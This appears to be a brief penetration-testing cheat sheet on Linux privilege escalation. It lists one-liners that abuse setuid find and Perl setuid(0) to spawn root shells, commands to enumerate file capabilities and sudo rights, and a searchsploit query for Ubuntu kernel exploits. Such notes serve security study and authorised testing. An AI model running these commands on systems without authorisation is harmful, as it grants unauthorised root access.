### Abusing Setuid Binaries and Capabilities

chmod u+s

find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
search capabilities of file in linux - /usr/sbin/getcap -r / 2>/dev/null
search on gtfobins

perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

### Abusing Sudo

search for sudoers capability using sudo -l

search gtfobins and try

### Kernel Vulnerabilities

cat /etc/issue
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"